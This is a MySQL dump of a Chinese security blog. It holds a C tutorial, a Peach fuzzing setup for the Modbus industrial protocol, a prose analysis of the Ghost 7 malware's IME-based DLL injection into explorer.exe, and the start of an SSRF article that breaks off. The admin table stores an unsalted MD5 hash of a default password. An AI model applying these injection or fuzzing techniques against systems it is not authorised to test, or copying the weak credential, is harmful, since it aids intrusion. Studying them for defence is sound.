# Host: localhost  (Version: 5.5.53)
# Date: 2017-11-04 12:25:33
# Generator: MySQL-Front 5.3  (Build 4.234)

/*!40101 SET NAMES utf8 */;

#
# Structure for table "tp_admin"
#

CREATE TABLE `tp_admin` (
  `id` mediumint(9) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) DEFAULT NULL,
  `password` char(32) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

#
# Data for table "tp_admin"
#

INSERT INTO `tp_admin` VALUES (2,'admin','21232f297a57a5a743894a0e4a801fc3');

#
# Structure for table "tp_article"
#

CREATE TABLE `tp_article` (
  `id` mediumint(9) NOT NULL AUTO_INCREMENT COMMENT '文章ID',
  `title` varchar(60) DEFAULT NULL COMMENT '文章标题',
  `author` varchar(30) DEFAULT NULL COMMENT '文章作者',
  `desc` varchar(255) DEFAULT NULL COMMENT '文章简介',
  `keywords` varchar(255) DEFAULT NULL COMMENT '文章关键词',
  `content` text COMMENT '文章内容',
  `pic` varchar(255) DEFAULT NULL COMMENT '缩略图',
  `click` int(10) DEFAULT '0' COMMENT '点击数',
  `state` tinyint(1) DEFAULT '0' COMMENT '0:不推荐 1:推荐',
  `time` int(10) DEFAULT NULL COMMENT '发布时间',
  `cateid` mediumint(9) DEFAULT NULL COMMENT '所属栏目',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=944 DEFAULT CHARSET=utf8;

#
# Data for table "tp_article"
#

INSERT INTO `tp_article` VALUES (1,'Hello World','admin','Hello World','C语言','<p>一.首先，打开我们的Visual C++ 6.0软件，我使用的为中文版，软件主界面如下图所示：<img src=\"http://images2015.cnblogs.com/blog/786644/201510/786644-20151015095409866-1631619608.png\" alt=\"\"/></p><p>1.然后点击上图工具栏中的文件，里面有个新建菜单，然后我们可以设置一下我们的工作空间，如下图所示：<img src=\"http://images2015.cnblogs.com/blog/786644/201510/786644-20151015100712304-1613728954.png\" alt=\"\"/></p><p>2.然后在一步步默认点击确定，完成即可，此时工作空间就建立起来了！</p><p>&nbsp;</p><p>二.接下来，再点击工具栏下的文件，里面有个新建菜单，点击它，出现下图的对话框：</p><p><img src=\"http://images2015.cnblogs.com/blog/786644/201510/786644-20151015101506601-362613768.png\" alt=\"\"/></p><p>1.点击确定即可，创建出一个helloworld.c的小程序，然后我们就可以编写我们的Hello&nbsp;World小程序了。</p><p>2.程序代码如下：</p><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr class=\"firstRow\"><td class=\"gutter\"><div class=\"line number1 index0 alt2\">1</div><div class=\"line number2 index1 alt1\">2</div><div class=\"line number3 index2 alt2\">3</div><div class=\"line number4 index3 alt1\">4</div><div class=\"line number5 index4 alt2\">5</div><div class=\"line number6 index5 alt1\">6</div></td><td class=\"code\"><div class=\"line number1 index0 alt2\"><code class=\"cpp preprocessor\">#include &lt;stdio.h&gt;　　</code></div><div class=\"line number2 index1 alt1\">&nbsp;</div><div class=\"line number3 index2 alt2\"><code class=\"cpp keyword bold\">void</code> <code class=\"cpp plain\">main()</code></div><div class=\"line number4 index3 alt1\"><code class=\"cpp plain\">{</code></div><div class=\"line number5 index4 alt2\"><code class=\"cpp spaces\">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class=\"cpp functions bold\">printf</code><code class=\"cpp plain\">(</code><code class=\"cpp string\">&quot;Hello World \\n&quot;</code><code class=\"cpp plain\">);</code></div><div class=\"line number6 index5 alt1\"><code class=\"cpp plain\">}</code></div></td></tr></tbody></table><p>&nbsp;</p><p>&nbsp;3.此时就需要我们的VC++ 6.0来编译此程序，编译无错误才运行此程序，编译按钮和运行按钮如下图的红色箭头处：<img src=\"http://images2015.cnblogs.com/blog/786644/201510/786644-20151015104732554-43927627.png\" alt=\"\"/></p><p>4.或者可以点击组建工具栏下的编译菜单项，然后再点击执行菜单项，也有快捷键，按Ctrl+F7编译此程序，按Ctrl+F5运行此程序。</p><p>5.编译无错误的话，点击运行按钮后如下图所示：　</p><p>&nbsp;<img src=\"http://images2015.cnblogs.com/blog/786644/201510/786644-20151015105204194-1811703846.png\" alt=\"\"/></p><p>&nbsp;</p><p>三.代码解析：</p><p>1.其中第一行的#include &lt;stdio.h&gt;，这行代码是编译预处理指令，用来提供输入输出函数的声明和宏的定义，全局量的定义这些信息。stdio.h是系统提供的一个文件名，stdio是为standard&nbsp;input &amp;&nbsp;output的缩写，意为标准输入输出，文件后缀.h的意思是头文件(header file)，因为这些文件都是放在程序各文件模块的开头的。总的来说，输入输出函数的相关信息已事先放在stdio.h文件中，然后，要用#include指令把这些信息调入供使用。</p><p>2.void main(){}，main是主函数的函数名，表示这是一个主函数，每一个C源程序都必须有且只能有一个主函数。</p><p>3.函数调用语句，即调用printf(&quot;Hello World \\n&quot;);语句 ，printf函数的功能是把要输出的内容送到显示器去显示，即打印输出Hello&nbsp;World到windows&nbsp;控制台下，其中\\n为转义字符，具有转行的功能。</p><p>4.printf函数是一个由系统定义的标准函数，可在程序中直接调用。</p><p>&nbsp;</p><p>四.以上内容仅供大家学习参考，谢谢！</p><p>VC++ 6.0中文绿色版下载地址：http://download.csdn.net/download/u012561176/9182983</p><p>&nbsp;</p>','/uploads/20171104\\2f661576d3ed56b8f353e9482c52d6a3.jpg',0,1,1509768464,2),(2,'Peach对Modbus功能码的模糊测试','admin','概述\r\n\r\nMichael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。','Peach,模糊测试','<h2>基础知识</h2><h3>Peach简介</h3><h4>概述</h4><p>Michael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。</p><p>Peach支持对文件格式、ActiveX、网络协议、API等进行Fuzz测试；Peach Fuzz的关键是编写Peach Pit配置文件。</p><p>Windows下使用Peach3需要预先安装.net 4和windbg；Linux、OS X下需要安装Mono .net开发框架。</p><h4>命令行参数</h4><p><img alt=\"\" src=\"http://obr4sfdq7.bkt.clouddn.com/peachfuzz1.png\"/></p><ul class=\" list-paddingleft-2\"><li><p>-1：执行第1次测试。</p></li><li><p>-a：启动Peach代理。不指定”channel”默认为本地代理（默认支持，无需显式启动）；\r\n“channel”可以指定为”tcp”远程代理。</p></li><li><p>-c：统计测试用例数。</p></li><li><p>-t：验证Peach Pit xml文件正确性。</p></li><li><p>-p：并行Fuzz。运行Peach的机器总数为M，这是第N个。</p></li><li><p>–debug：调试信息开关。</p></li><li><p>–skipto：指定Fuzz跳过的测试用例数。</p></li><li><p>–range：指定Fuzz的测试用例范围。</p></li></ul><h3>Peach Pit</h3><p>在使用Peach进行Fuzz之前需要编写被称为”Peach Pit”的xml配置文件，其中包含着如何进行Fuzz的关键信息，如下图：<img alt=\"\" src=\"http://obr4sfdq7.bkt.clouddn.com/peachfuzz2.png\"/></p><h3>peach模糊测试</h3><p>在研究网络协议模糊测试时，sulley和peach两大框架是最常见的Fuzz框架，peach相对于sulley有以下几点优势：</p><ul class=\" list-paddingleft-2\"><li><p>1、sulley目前已不再维护。</p></li><li><p>2、对sulley模糊测试编写程序，需要有一定的python语言基础。而peach是xml格式的，比较容易理解。</p></li><li><p>3、sulley配置环境相对繁琐，而peach配置环境相对简单（目前我手头有绿色版本，可以直接运行）。</p></li><li><p>4、sulley只能对网络协议进行模糊测试，而peach相对更加多样化。</p></li></ul><h2>Peach协议Fuzz</h2><h3>工作流程图</h3><p><img alt=\"\" src=\"http://obr4sfdq7.bkt.clouddn.com/peachfuzz3.png\"/></p><h4>流程图具体工作原理</h4><ul class=\" list-paddingleft-2\"><li><p>1、根据协议控制规范或者捕获工业控制网络协议数据流来构造正常的数据包；</p></li><li><p>2、分析正常协议的字段及其重要性；</p></li><li><p>3、根据分析的协议中不同的数据类型，设计有效地变异策略。</p></li><li><p>4、设计并实现工业控制网络协议数据包发包工具；</p></li><li><p>5、设计并实现代理器及监视器；</p></li><li><p>6、采用发包工具，将畸形数据包发送给被测工控目标；</p></li><li><p>7、通过监视器探测被测工控目标异常数据记录。</p></li></ul><h3>NetWork.xml简单分析</h3><p>在Peach的目录里有个samples目录,里面有官方给出的一些Pit，以NetWork.xml文件为例做一个简单的分析，具体如下：</p><p><img alt=\"\" src=\"http://obr4sfdq7.bkt.clouddn.com/peachfuzz4.png\"/></p><h3>Modbus Fuzz Pit编写</h3><p>由于是初次接触Peach对Modbus工控协议的模糊测试，目前也对Modbus协议不是很熟悉，所以只能在网络上找个各种资料。\r\n经过一番寻找，最终在github上找到了一份Pit，就是关于对modbus功能码的Fuzz Peach Pit。文章Reference处给出链接。\r\n简单地阅读和分析这个Pit发现，这个Pit对01 02 03 04 05 06 15 16 20 21 22 23 24 这几个功能进行Fuzz。除了22 23 24这几个功能码没有在文章开头提到，其他都在基础知识中有。关于22 23 24三个功能码具体如下</p><p>|代码\t|作用描述|\r\n| ------------- |:-------------:|\r\n|22|屏蔽写寄存器|\r\n|23|读/写多个寄存器|\r\n|24|读FIFO队列|</p><p>另外发现，在我们找到的Pit中，缺少了Agents-Monitors部分即监听器模块部分。Agents部分可以在本地或远程运行，可以执行附加调试器的动作，看内存消耗，检测故障等。\r\n查看官方文档可以知道Peach Fuzz根据不同的环境类型支持以下几种Monitors</p><p>Windows Monitors<em>\tWindows Debugger Monitor</em>\tCleanup Registry Monitor<em>\tPage Heap Monitor</em>\tPopup Watcher Monitor\r\n*\tWindows Service Monitor</p><p>OS X Monitors<em>\tOS X Crash Wrangler Monitor</em>\tOS X Crash Reporter Monitor</p><p>Linux Monitors\r\n*\tLinux Crash Monitor</p><p>Cross Platform Monitors<em>\tCanaKit Relay Monitor</em>\tCleanup Folder Monitor<em>\tIpPower9258 Monitor</em>\tMemory Monitor<em>\tPcap Network Monitor</em>\tPing Monitor<em>\tProcess Launcher Monitor</em>\tProcess Killer Monitor<em>\tSave File Monitor</em>\tSocket Listener Monitor<em>\tSSH Monitor</em>\tSSH Downloader Monitor\r\n*\tVmware Control Monitor</p><p>由于我们是对Modbus工控协议的模糊测试，这里我们可以用常见的Ping Monitor和Socket Listener Monitor。经过向一些之前有过Modbus Peach Fuzz研究的前辈的请教，得到结果是用Ping Monitor的误报率比较高，所以我们在编写是使用的是Socket Listener Monitor。</p><p>以下给出Ping Monitor和Socket Listener Monitor的编写模板</p><h4>Ping Monitor</h4><p>Parameters</p><ul class=\" list-paddingleft-2\"><li><p>Host — Hostname or IP address</p></li><li><p>Timeout — Timeout in milliseconds (optional, defaults to 1,000)</p></li><li><p>Data — Data to send in ping packet (optional)</p></li><li><p>FaultOnSuccess — Fault if ping is successful (optional, defaults to false)</p></li></ul><p>Examples<code>&lt;Agent name=&quot;Local&quot;&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;Monitor class=&quot;Ping&quot;&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;Param name=&quot;Host&quot; value=&quot;www.google.com&quot; /&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;/Monitor&gt;\r\n&lt;/Agent&gt;</code></p><h4>Socket Monitor</h4><p>Parameters</p><ul class=\" list-paddingleft-2\"><li><p>Host — IP address of remote host (optional, defaults to &quot;&quot;)</p></li><li><p>Interface — IP address of interface to listen on (optional, defaults to 0.0.0.0)</p></li><li><p>Port — Port to listen on (optional, defaults to 8080)</p></li><li><p>Protocol — Protocol type to listen for (optional, defaults to tcp)</p></li><li><p>Timeout — Length of time to wait for incoming connection (optional, defaults to 1000 ms)</p></li><li><p>FaultOnSuccess — Fault if no conection is recorded (optional, defaults to false)</p></li></ul><p>Examples<code>&lt;Agent name=&quot;Local&quot;&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;Monitor class=&quot;Socket&quot;&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;Param name=&quot;Port&quot; value=&quot;53&quot; /&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;/Monitor&gt;\r\n&lt;/Agent&gt;</code></p><p>由官方文档最终得到如下Agent<code>\r\n\t&lt;Agent name=&quot;Local&quot;&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;Monitor class=&quot;Socket&quot;&gt;\r\n\t\t\t\t&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot; /&gt;\r\n\t\t\t\t&lt;Param name=&quot;Port&quot; value=&quot;502&quot; /&gt;\r\n &nbsp; &nbsp; &nbsp; &nbsp;&lt;/Monitor&gt;\r\n\t&lt;/Agent&gt;</code></p><p>在TEST模块里引用Agent模块`\r\n\t&lt;Test name=&quot;Default&quot;&gt;\r\n\t\t&lt;StateModel ref=&quot;ModbusStateModel&quot; /&gt;</p><pre>\t&lt;Agent&nbsp;ref=&quot;Local&quot;&nbsp;/&gt;\r\n\r\n\t&lt;Logger&nbsp;class=&quot;File&quot;&gt;\r\n\t\t&lt;Param&nbsp;name=&quot;Path&quot;&nbsp;value=&quot;c:\\log1&quot;/&gt;\r\n\t&lt;/Logger&gt;\r\n\t&lt;Publisher&nbsp;class=&quot;tcp.Tcp&quot;&gt;\r\n\t\t&lt;Param&nbsp;name=&quot;Host&quot;&nbsp;value=&quot;192.168.1.100&quot;/&gt;\r\n\t\t&lt;Param&nbsp;name=&quot;Port&quot;&nbsp;value=&quot;502&quot;/&gt;\r\n\t&lt;/Publisher&gt;\r\n&lt;/Test&gt;</pre><p>`</p><h3>运行测试</h3><p>先简单的说明下这个Pit的基本原理就是给工控设备发送合法的功能码，然后对数据部分进行变异。在这个过程用监听器监听，如果出现崩溃就会出现崩溃日志。这个过程是很漫长的过程，经过我跟Modbus Peach Fuzz的前辈进行的交流，得知他们的模糊测试点都是经过逆向找到的，所以Pit是不能发给我的。而我们这边目前只能对功能码进行模糊测试。据我了解对Modbus协议的模糊测试，需要先提取固件，然后对固件逆向分析，找到模糊测试的点，国内做的很少。</p><p><img alt=\"\" src=\"http://obr4sfdq7.bkt.clouddn.com/peachfuzz5.png\"/></p><h2>Github Link</h2><p><a href=\"https://github.com/uknowsec/ModbusPeachPit\">Modbus Peach Pit</a></p><h2>Reference</h2><p><a href=\"https://github.com/jseidl/peach-pit\">Github Peach Fuzzer PIT Files</a><a href=\"http://community.peachfuzzer.com/v3/PeachPit.html\">PeachPit官方文档</a><a href=\"http://blog.nsfocus.net/peach-fuzz/\">浅析Peach Fuzz</a><a href=\"http://www.freebuf.com/articles/security-management/88249.html\">工控网络协议模糊测试：用peach对modbus协议进行模糊测试</a></p>','/uploads/20171104\\3f9e55b05bca2b2d19e688cd5b2e7c6e.png',1,1,1509768748,3),(3,'鬼影7病毒详细分析(I)','admin','Windows作者：sev7n                 \r\n2014-09-1011,095\r\n0×01: 病毒名称：\r\n\r\n鬼影7','逆向分析','<h1 class=\"blue\">鬼影7病毒详细分析(I)</h1><p><span class=\"tag mr40\"><a style=\"color:#0f487d;\" href=\"https://www.secpulse.com/archives/category/articles/system/windows\">Windows</a></span><span class=\"writer\">作者：<a href=\"/archives/author/sev7n\">sev7n</a> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><em class=\"iconfont icon-iconfont11\"></em><span class=\"time mr20\">2014-09-10</span><em class=\"iconfont icon-browse\"></em><span class=\"browse\">11,095</span></p><h2 style=\"color: #555555;\"><span style=\"color: #008000;\">0×01: 病毒名称：</span></h2><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">鬼影7</span></p><h2 style=\"color: #555555;\"><span style=\"color: #008000;\">0x02: 病毒释放的主要文件</span></h2><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">C:\\Windows\\System32\\64A506EC.tmp(该文件名为随机字符+explorer进程ID.tmp) &nbsp;此文件为病毒副本程序。</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">C:\\Users\\a\\AppData\\Local\\Temp\\ 55596a66.bat(自删除批处理脚本)</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">C:\\Windows\\System32\\ 5D27626D.sys(驱动程序)</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">C:\\Windows\\System32\\ AeLookupSvc.dll(系统中不存在的服务程序，以服务程序名命名)</span></p><h2 style=\"color: #555555;\"><span style=\"color: #008000;\">0x03: &nbsp;病毒主要行为及作用</span></h2><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">此次分析主要是鬼影7外壳程序分析，其所释放的驱动程序和服务程序请静待下回分析</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">外壳程序主要行为：</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">判断自已是否注入到其它进程中运行，如果已注入到其它进程，病毒会安装驱动等，服务等主体程。</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">一.没有注入的病毒行为：</span></p><p style=\"padding-left: 60px;\"><span style=\"color: #000000;\">&lt;1&gt;.首先会判断KB2536276666.log文件是否存在，该文件标志着该电脑是否被感染。如存在就退出运行。</span></p><p style=\"padding-left: 60px;\"><span style=\"color: #000000;\">&lt;2&gt;.检测本机所运行的相关安全软件，并设置标志位。</span></p><p style=\"padding-left: 60px;\"><span style=\"color: #000000;\">&lt;3&gt;.配置本机输入法注册表相关设置，释放C:\\Windows\\System32\\64A506EC.tmp文件，分别HOOK imm32.dll 的ImmLoadLayout函数与ntdll.dll的ZwQueryValueKey函数，然后显示调用LoadKeyboardLayout，并发送WM_INPUTLANGCHANGEREQUEST将64A506EC注入到explorer.exe进程中。此时木马检测是否注入成功，如成功就退出运行，失败则会在当前进程释放驱动和服务DLL程序并安装。</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">二．注入到傀儡进程中的行为：</span></p><p style=\"padding-left: 60px;\"><span style=\"color: #000000;\">&lt;1&gt;.注入到傀儡进程中的病毒程序就是原程序副本，只是运行环境发生变化，病毒运行时检测所注入的傀儡进程名称，然后根据注入进程不同执行不同行为。</span></p><p style=\"padding-left: 60px;\"><span style=\"color: #000000;\">&lt;2&gt;.注入的进程如果是explorer.exe病毒就释放驱动和服务DLL程序并安装，如果是setup.exe程序，病毒就会重新执行没有注入的病毒行为。如果注入的是HELPCTR.EXE,control.exe进程时，病毒设置输入法DLL程序，然后退出运行。</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">作用：此外壳程序主要作用就是安装一个系统底层的驱动程序和一个RING3的服务程序。</span></p><p style=\"padding-left: 30px;\"><span style=\"color: #000000;\">其病毒主要的作用在所释放安装的两个服务程序当中，这两个服务程序的详细分解请静待下章。</span></p><h2 style=\"color: #555555;\">0x04: 详细分析</h2><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/c36e064696fc27e789c38615a83daedf1.jpg\"><img class=\"alignnone size-full wp-image-351\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/c36e064696fc27e789c38615a83daedf1.jpg\" alt=\"c36e064696fc27e789c38615a83daedf\" width=\"648\" height=\"365\"/></a></p><p>&nbsp;</p><p>&nbsp;</p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic1.png\"><img class=\"alignnone size-full wp-image-214\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic1.png\" alt=\"图片1\" width=\"624\" height=\"243\"/></a></p><p><span style=\"color: #000000;\">病毒入口点如上图：病毒开始执行时就用自定位方式获取当前执行时偏移地址，然后和当前进程模块比较，以此来检测是否注入到傀儡进程中运行。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic2.png\"><img class=\"alignnone size-full wp-image-215\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic2.png\" alt=\"图片2\" width=\"714\" height=\"308\"/></a></p><p>&nbsp;</p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic3.png\"><img class=\"alignnone size-full wp-image-216\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic3.png\" alt=\"图片3\" width=\"521\" height=\"127\"/></a></p><p>&nbsp;</p><p><span style=\"color: #000000;\">木马检测系统是否被感染过，如果系统已经种植了该病毒程序，则不继续感染。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic4.png\"><img class=\"alignnone size-full wp-image-217\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic4.png\" alt=\"图片4\" width=\"788\" height=\"324\"/></a></p><p><span style=\"color: #000000;\">病毒跳转到自身所构造的SHELLCODE中运行，但这些SHELLCODE代码全是90，即什么都不干，此处用意估计是迷惑逆向分析者，无实在意义。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic5.png\"><img class=\"alignnone size-full wp-image-218\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic5.png\" alt=\"图片5\" width=\"488\" height=\"578\"/></a></p><p><span style=\"color: #000000;\">病毒检测一些系统运行的安全软件，如360tray.exe,HardwareInfo.exe,HintClient.exe,AVP.exe等，其中explorer.exe为病毒要注入的傀儡进程，病毒会获取该进程ID，然后以些ID+随机字串生成要注入的傀儡DLL文件。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic6.png\"><img class=\"alignnone size-full wp-image-219\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic6.png\" alt=\"图片6\" width=\"466\" height=\"66\"/></a></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic7.png\"><img class=\"alignnone size-full wp-image-220\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic7.png\" alt=\"图片7\" width=\"720\" height=\"132\"/></a></p><p><span style=\"color: #000000;\">病毒生成傀儡DLL文件64A506EC.tmp。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic8.png\"><img class=\"alignnone size-full wp-image-221\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic8.png\" alt=\"图片8\" width=\"727\" height=\"419\"/></a></p><p><span style=\"color: #000000;\">病毒获取Imm32.dll的ImmLoadLayout与ZwQueryValueKey函数地址，用来HOOK这两个函数。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic21.png\"><img class=\"alignnone size-full wp-image-234\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic21.png\" alt=\"图片21\" width=\"641\" height=\"26\"/></a></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic9.png\"><img class=\"alignnone size-full wp-image-222\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic9.png\" alt=\"图片9\" width=\"675\" height=\"143\"/></a></p><p><span style=\"color: #000000;\">病毒HOOK了以上两个函数，然后病毒调用LoadKeyboardLayout函数，此时ImmLoadLayout，ZwQueryValueKey会被调用，病毒在ZwQueryValueKey会在该函数内部返回64A506EC.tmp字串，然后恢复被HOOK的函数，以上行为意在用输入法原理注入到目标进程当中，要注入的目标进程是explorer.exe，病毒马上会发送WM_INPUTLANGCHANGEREQUEST消息给explorer.exe进程，这时病毒DLL就会注入explorer.exe进程中。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic.png\"><img class=\"alignnone size-full wp-image-223\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic10.png\" alt=\"图片10\" width=\"782\" height=\"175\"/></a></p><p><span style=\"color: #000000;\">病毒向explorer.exe进程发送WM_INPUTLANGCHANGEREQUEST消息。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic11.png\"><img class=\"alignnone size-full wp-image-224\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic11.png\" alt=\"图片11\" width=\"559\" height=\"171\"/></a></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic12.png\"><img class=\"alignnone size-full wp-image-225\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic12.png\" alt=\"图片12\" width=\"432\" height=\"136\"/></a></p><p><span style=\"color: #000000;\">病毒等待全局事件，如果该事件被置位，则说明病毒成功注入explorer.exe进程，如果等待超时或返回失败时，病毒就会在当前进程中完成注入到explorer.exe傀儡进程的任务，即完成驱动及服务的释放与安装。</span></p><p>&nbsp;</p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic13.png\"><img class=\"alignnone size-full wp-image-226\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic13.png\" alt=\"图片13\" width=\"736\" height=\"255\"/></a></p><p>&nbsp;</p><p><span style=\"color: #000000;\">如上图所示，病毒成功将64A506EC.tmp动态链接库注入到explorer.exe中，此DLL动态链接库为病毒副本程序，只是该病毒在运行时就会测测运行环境，所以注入到explorer.exe进程中的病毒会有所不同，它会直接尝试创建服务等程序。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic14.png\"><img class=\"alignnone size-full wp-image-227\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic14.png\" alt=\"图片14\" width=\"660\" height=\"387\"/></a></p><p><span style=\"color: #000000;\">注入到explorer.exe进程中的病毒检测当前所注入的进程名称，如果不是setup.exe,control.exe,HELPCTR.exe时，病毒会创建一个线程，在线程中检测是否是注入到explorer.exe中，如果是病毒就开始执行主要功能。如果不是explorer.exe,则退出运行。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic15.png\"><img class=\"alignnone size-full wp-image-228\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic15.png\" alt=\"图片15\" width=\"732\" height=\"247\"/></a></p><p><span style=\"color: #000000;\">病毒检测注入进程的ID是否是explorer.exe进程。如果则置为全局事件，结束刚才验证是否注入成功的进程。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic16.png\"><img class=\"alignnone size-full wp-image-229\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic16.png\" alt=\"图片16\" width=\"617\" height=\"263\"/></a></p><p><span style=\"color: #000000;\">置位全局事件。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic17.png\"><img class=\"alignnone size-full wp-image-230\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic17.png\" alt=\"图片17\" width=\"547\" height=\"113\"/></a></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic18.png\"><img class=\"alignnone size-full wp-image-231\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic18.png\" alt=\"图片18\" width=\"656\" height=\"227\"/></a></p><p><span style=\"color: #000000;\">病毒它建驱动服务程序，并验证是否运行起来，如果创建的驱动服务没有运行，就会调用CreateService他建服务，并启动服务。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic19.png\"><img class=\"alignnone size-full wp-image-232\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic19.png\" alt=\"图片19\" width=\"673\" height=\"399\"/></a></p><p><span style=\"color: #000000;\">病毒创建RING3服务程序。</span></p><p><a href=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic20.png\"><img class=\"alignnone size-full wp-image-233\" src=\"http://www.secpulse.com/wp-content/uploads/2014/09/pic20.png\" alt=\"图片20\" width=\"645\" height=\"356\"/></a></p><p><span style=\"color: #000000;\">病毒创建RING3服务文件。</span></p><p>&nbsp;</p><p>&nbsp;</p><blockquote><p style=\"color: #555555;\"><span style=\"color: #339966;\">原创作者：sev7n</span></p><p style=\"color: #555555;\"><span style=\"color: #339966;\">SP地址：<span id=\"sample-permalink\" tabindex=\"-1\">http://www.secpulse.com/archives/206.html</span> </span></p></blockquote>','/uploads/20171104\\83e57f828c4bb49f44bce0036e0571d3.jpg',1,1,1509768973,4),(4,'SSRF漏洞的利用与学习','admin','​漏洞简介\r\n\r\nSSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。','SSRF','<h2 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 24px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">漏洞简介</h2><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p><h2 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 24px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">漏洞利用</h2><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p><h3 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 18px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">本地利用</h3><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; 